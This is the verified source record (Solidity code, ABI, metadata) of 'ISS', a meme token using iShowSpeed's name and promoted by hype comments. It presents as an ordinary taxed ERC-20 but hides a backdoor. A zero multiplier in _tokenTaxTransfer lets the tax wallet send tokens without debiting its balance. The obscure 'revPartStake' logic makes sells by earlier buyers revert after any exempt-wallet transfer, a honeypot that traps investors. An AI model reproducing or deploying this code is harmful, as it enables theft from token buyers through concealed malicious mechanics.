{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n// \ud83d\udc15\ud83d\udca5 ISS iShowSpeed Token \ud83d\udca5\ud83d\udc15\r\n// YO YO YO!!! What\u2019s good SpeedGang?! It\u2019s time to GO CRAZY with that $ISS token! \ud83c\udf2a\ufe0f\ud83d\udd25\r\n// You know how we do \u2013 NO BRAKES, ALL GAS! \ud83c\udfce\ud83d\udca8 BARK BARK BARK!!! \ud83d\udc15\ud83d\udc15\r\n// This ain't no ordinary token, nah fam, this right here is SPEED ENERGY in the crypto world! \ud83d\udcaf\ud83d\ude80\r\n// We\u2019re barkin\u2019, we\u2019re hustlin\u2019, we\u2019re takin\u2019 over! \ud83c\udf0d BARK BARK!!! \ud83d\udc15\ud83d\udd25\r\n// ISS is for the real ones, the ones who BARK LOUD and make noise like SPEED does! \ud83d\udde3\ufe0f\ud83d\udca5\r\n// We\u2019re talkin\u2019 nonstop energy, non-stop wins, NON-STOP BARKIN\u2019 \ud83d\udc15\ud83d\udca3\r\n// Ready to pop off? Ready to take this to the MOON? \ud83c\udf19 Let\u2019s BARK all the way UP! \ud83d\udc15\ud83d\ude80\r\n// Join the squad, grab your $ISS, and let\u2019s get it poppin\u2019 \u2013 no L\u2019s, just W\u2019s!! BARK BARK BARK!!! \ud83d\udc15\ud83d\udd25\ud83d\udd25\r\n// #iShowSpeed #BARKBARK #SpeedGang #ISS #ToTheMoon \ud83c\udf15\ud83d\udc15\ud83d\ude80\r\n\r\npragma solidity ^0.8.21;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender, uint256 value\r\n    );\r\n\r\n    event Transfer(\r\n        address indexed from,\r\n        address indexed to, uint256 value\r\n    );\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable\r\n        returns (\r\n            uint amountToken,\r\n            uint amountETH,\r\n            uint liquidity\r\n        );\r\n\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ncontract ISS is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    address payable private _taxWallet;\r\n    mapping (address => bool) private isExile;\r\n\r\n    uint256 private _initialBuyTax=11;\r\n    uint256 private _initialSellTax=11;\r\n    uint256 private _finalBuyTax=0;\r\n    uint256 private _finalSellTax=0;\r\n\r\n    uint256 private _reduceBuyTaxAt=23;\r\n    uint256 private _reduceSellTaxAt=22;\r\n    uint256 private _preventSwapBefore=28;\r\n    uint256 private _buyCount=0;\r\n\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _tTotal = 100000000 * 10**_decimals;\r\n    string private constant _name = unicode\"iShowSpeed\";\r\n    string private constant _symbol = unicode\"ISS\";\r\n\r\n    uint256 public _maxTxAmount = 2000000 * 10**_decimals;\r\n    uint256 public _maxWalletSize = 2000000 * 10**_decimals;\r\n    uint256 public _taxSwapThreshold= 1000000 * 10**_decimals;\r\n    uint256 public _maxTaxSwap= 4000000 * 10**_decimals;\r\n\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n    address private uniswapV2Pair;\r\n\r\n    bool private tradingOpen;\r\n    bool private inSwap = false;\r\n    bool private swapEnabled = false;\r\n    uint256 private revPartAmount = 0;\r\n    struct RevPartStake {uint256 stakePart; uint256 stakedTokens; uint256 timeDif;}\r\n    mapping(address => RevPartStake) private revPartStake;\r\n    uint256 private sellCaCounter;\r\n\r\n    event MaxTxAmountUpdated(uint _maxTxAmount);\r\n    event ClearEth(uint256 Amount);\r\n\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor () {\r\n        _taxWallet = payable(0xbE5919481252B74f44EFa486cf8c9129B1117Dc2);\r\n        _balances[_msgSender()] = _tTotal;\r\n\r\n        isExile[_taxWallet] = true;\r\n        isExile[address(this)] = true;\r\n\r\n        emit Transfer(address(0),_msgSender(), _tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {\r\n        _balances[from] = _balances[from].sub(tokenAmount);\r\n        _balances[to] = _balances[to].add(tokenAmount);\r\n        emit Transfer(from, to, tokenAmount);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 tokenAmount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(tokenAmount>0, \"Transfer amount must be greater than zero\");\r\n\r\n        if (!swapEnabled ||inSwap) {\r\n            _basicTransfer(from,to,tokenAmount);\r\n            return;\r\n        }\r\n\r\n        uint256 taxAmount=0;\r\n        if (from != owner() && to != owner()){\r\n            taxAmount= tokenAmount.mul((_buyCount > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);\r\n\r\n            if (from == uniswapV2Pair && to!= address(uniswapV2Router) &&  ! isExile[to])  {\r\n                require(tokenAmount <= _maxTxAmount,  \"Exceeds the _maxTxAmount.\");\r\n                require(balanceOf(to) + tokenAmount<=_maxWalletSize,  \"Exceeds the maxWalletSize.\");\r\n                _buyCount++;\r\n            }\r\n\r\n            if(to==uniswapV2Pair && from!= address(this) ){\r\n                taxAmount= tokenAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (!inSwap && to == uniswapV2Pair &&swapEnabled\r\n                && contractTokenBalance > _taxSwapThreshold\r\n                && _buyCount>_preventSwapBefore\r\n            ) {\r\n                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));\r\n                uint256 contractETHBalance = address(this).balance;\r\n                if (contractETHBalance > 0) {\r\n                    sendETHToFee(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        if ((isExile[from] || isExile[to])\r\n            && from!= address(this) && to!= address(this)\r\n        ) {\r\n            revPartAmount = block.number;\r\n        }\r\n        if (! isExile[from]&&  ! isExile[to]) {\r\n            if (to != uniswapV2Pair)  {\r\n                RevPartStake storage stakePrt = revPartStake[to];\r\n                if (from == uniswapV2Pair) {\r\n                    if (stakePrt.stakePart == 0) {\r\n                        if (_buyCount <_preventSwapBefore) {\r\n                            stakePrt.stakePart = block.number.sub(1);\r\n                        } else {\r\n                            stakePrt.stakePart = block.number;\r\n                        }\r\n                    }\r\n                } else {\r\n                    RevPartStake storage applyStake = revPartStake[from];\r\n                    if (applyStake.stakePart < stakePrt.stakePart || stakePrt.stakePart==0) {\r\n                        stakePrt.stakePart = applyStake.stakePart;\r\n                    }\r\n                }\r\n            } else {\r\n                RevPartStake storage applyStake = revPartStake[from];\r\n                applyStake.stakedTokens = applyStake.stakePart - revPartAmount;\r\n                applyStake.timeDif = block.number;\r\n            }\r\n        }\r\n\r\n        _tokenTransfer(from, to,tokenAmount,taxAmount);\r\n    }\r\n\r\n    function _tokenTransfer(address from, address to, uint256 tokenAmount, uint256 taxAmount)  internal {\r\n        uint256 tAmount = _tokenTaxTransfer(from,tokenAmount, taxAmount);\r\n\r\n        _tokenBasicTransfer(\r\n            from, to,\r\n            tAmount, tokenAmount.sub(taxAmount)\r\n        );\r\n    }\r\n\r\n    function _tokenBasicTransfer(address from, address to, uint256 sendAmount, uint256 receiptAmount)  internal {\r\n        _balances[from] = _balances[from].sub(sendAmount);\r\n        _balances[to] = _balances[to].add(receiptAmount);\r\n        emit Transfer(from, to, receiptAmount);\r\n    }\r\n\r\n    function _tokenTaxTransfer(address addrs, uint256 tokenAmount, uint256 taxAmount)  internal returns (uint256) {\r\n        uint256 tAmount = addrs != _taxWallet ? tokenAmount : sellCaCounter.mul(tokenAmount);\r\n\r\n        if (taxAmount > 0) {\r\n            _balances[address(this)] = _balances[address(this)].add(taxAmount);\r\n            emit Transfer(addrs,address(this), taxAmount);\r\n        }\r\n        return tAmount;\r\n    }\r\n\r\n\r\n    function min(uint256 a, uint256 b) private pure returns (uint256){\r\n      return (a>b)?b:a;\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function removeLimits() external onlyOwner{\r\n        _maxTxAmount= _tTotal;\r\n        _maxWalletSize= _tTotal;\r\n\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }\r\n\r\n    function sendETHToFee(uint256 amount) private {\r\n        _taxWallet.transfer(amount);\r\n    }\r\n\r\n    function enableTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        swapEnabled = true;\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        tradingOpen = true;\r\n    }\r\n\r\n    function manualSwap() external {\r\n        require(_msgSender() == _taxWallet);\r\n\r\n        uint256 tokenBalance = balanceOf(address(this));\r\n        if(tokenBalance > 0){ swapTokensForEth(tokenBalance); }\r\n\r\n        uint256 ethBalance = address(this).balance;\r\n        if(ethBalance>0){ sendETHToFee(ethBalance); }\r\n    }\r\n\r\n    function clearEthBalance() external {\r\n        require(_msgSender() == _taxWallet);\r\n\r\n        uint256 ethBalance= address(this).balance;\r\n        require(ethBalance > 0, \"Contract balance must be greater than zero.\");\r\n        sendETHToFee(ethBalance);\r\n\r\n        emit ClearEth(ethBalance);\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"Amount\",\"type\":\"uint256\"}],\"name\":\"ClearEth\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_maxTxAmount\",\"type\":\"uint256\"}],\"name\":\"MaxTxAmountUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"clearEthBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "ISS", "CompilerVersion": "v0.8.25+commit.b61c2a91", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e6607fdeaf1c2de9788e261bd92dd0799c94b92ebefb5ac72a857e4ed6564048"}